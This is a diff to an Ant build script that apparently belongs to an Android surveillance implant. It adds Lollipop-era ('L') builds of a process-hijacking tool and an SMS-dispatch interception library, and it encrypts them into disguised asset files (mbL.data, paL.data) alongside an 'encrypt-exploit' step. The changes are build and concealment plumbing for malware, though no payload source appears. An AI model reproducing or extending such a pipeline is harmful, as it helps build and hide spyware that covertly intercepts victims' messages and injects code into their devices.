@@ -51,6 +51,8 @@
 
 	<property name="ddi.sms.lib" value="procacc" />
 	<property name="ddi.sms.libout" value="libprocacc.so" />
+    <property name="ddi.sms.libL" value="procacc5" />
+    <property name="ddi.sms.liboutL" value="libprocacc5.so" />
     <property name="ddi.sms.dir" value="../instrumentation/ddi/examples/smsdispatch/" />
     <property name="ddi.hijacker" value="../instrumentation/adbi/hijack" />
 	<property name="rcscore.path" value="antlibs" />
@@ -142,18 +144,15 @@
 		<crypter encrypt="true" inputFile="preprocess/libt.so" keyFile="${randomKeyStatusDb}i" outputFile="assets/ib.data" salt="${randomSalt}" />
 		<delete file="assets/mb.data" />
 		<crypter encrypt="true" inputFile="preprocess/hijack" keyFile="${randomKeyStatusDb}m" outputFile="assets/mb.data" salt="${randomSalt}" />
-        	<delete file="assets/pa.data" />
-        	<crypter encrypt="true" inputFile="preprocess/${ddi.sms.libout}" keyFile="${randomKeyStatusDb}p" outputFile="assets/pa.data" salt="${randomSalt}" />
+        <delete file="assets/mbL.data" />
+        <crypter encrypt="true" inputFile="preprocess/hijackL" keyFile="${randomKeyStatusDb}m" outputFile="assets/mbL.data" salt="${randomSalt}" />
+        <delete file="assets/pa.data" />
+        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.libout}" keyFile="${randomKeyStatusDb}p" outputFile="assets/pa.data" salt="${randomSalt}" />
+        <delete file="assets/paL.data" />
+        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.liboutL}" keyFile="${randomKeyStatusDb}p" outputFile="assets/paL.data" salt="${randomSalt}" />
 	</target>
 
-	<target name="encrypt-hijacklibrary-debug">
-		<delete file="assets/ib.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
-		<delete file="assets/mb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
-        	<delete file="assets/pa.data" />
-        	<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.libout}" outputFile="assets/pa.data" />
-	</target>
+
 
         <target name="build-instrumentation-clean">
           <echo> cleaning dir ${ddi.sms.dir} </echo>
@@ -166,6 +165,7 @@
 
 <macrodef name="build-instr">
    <attribute name="lib" />
+   <attribute name="libout" />
    <attribute name="debug" />
    <attribute name="buildDir" />
    <attribute name="buildScript" />
@@ -176,30 +176,43 @@
         <arg value="@{lib}" />
         <arg value="@{debug}" />
      </exec>
-     <copy file="@{buildDir}/libs/armeabi/${ddi.sms.libout}" tofile="preprocess/${ddi.sms.libout}" overwrite="true" />
+     <copy file="@{buildDir}/libs/armeabi/@{libout}" tofile="preprocess/@{libout}" overwrite="true" />
   </sequential>
 </macrodef>
 
 <macrodef name="build-hijack">
    <attribute name="debug" />
    <attribute name="buildDir" />
+   <attribute name="out" />
    <sequential>
       <echo> building hijacker @{debug} </echo>
       <exec executable="./build.sh" dir="@{buildDir}" failonerror="true">
         <arg value="@{debug}" />
      </exec>
-     <copy file="@{buildDir}/libs/armeabi/hijack" tofile="preprocess/hijack" overwrite="true" />
+     <echo> coping hijacker @{out} </echo>
+     <copy file="@{buildDir}/libs/armeabi/hijack" tofile="preprocess/@{out}" overwrite="true" />
   </sequential>
 </macrodef>
 
+<target name="build-instrumentation-debug-L" depends="build-instrumentation-clean">
+    <build-hijack debug="-d -P"  buildDir="${ddi.hijacker}" out="hijackL"/>
+    <build-instr debug="-d -P" libout="${ddi.sms.liboutL}"  lib="-l${ddi.sms.libL}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+</target>
+
+<target name="build-instrumentation-L" depends="build-instrumentation-clean">
+   <build-hijack debug="-D -P"  buildDir="${ddi.hijacker}" out="hijackL"/>
+   <build-instr debug="-P"   libout="${ddi.sms.liboutL}" lib="-l${ddi.sms.libL}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+</target>
+
+
 <target name="build-instrumentation-debug" depends="build-instrumentation-clean">
-  <build-hijack debug="-d"  buildDir="${ddi.hijacker}" />
-  <build-instr debug="-d"  lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+  <build-hijack debug="-d"  buildDir="${ddi.hijacker}" out="hijack"/>
+  <build-instr debug="-d"  libout="${ddi.sms.libout}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
 </target>
 
 <target name="build-instrumentation" depends="build-instrumentation-clean">
-  <build-hijack debug="-D"  buildDir="${ddi.hijacker}" />
-  <build-instr debug=""   lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
+  <build-hijack debug="-D"  buildDir="${ddi.hijacker}" out="hijack"/>
+  <build-instr debug=""   libout="${ddi.sms.libout}" lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
 </target>
 
 
@@ -210,10 +223,10 @@
 </delete>
 </target>
 
-<target name="libs" depends="build-instrumentation, encrypt-exploit, encrypt-hijacklibrary">
+<target name="libs" depends="build-instrumentation, build-instrumentation-L, encrypt-exploit, encrypt-hijacklibrary">
 </target>
 
-<target name="libs-debug" depends="build-instrumentation-debug, encrypt-exploit,  encrypt-hijacklibrary">
+<target name="libs-debug" depends="build-instrumentation-debug, build-instrumentation-debug-L, encrypt-exploit,  encrypt-hijacklibrary">
 </target>
 
 <target name="init" depends="salt" unless="build.number">
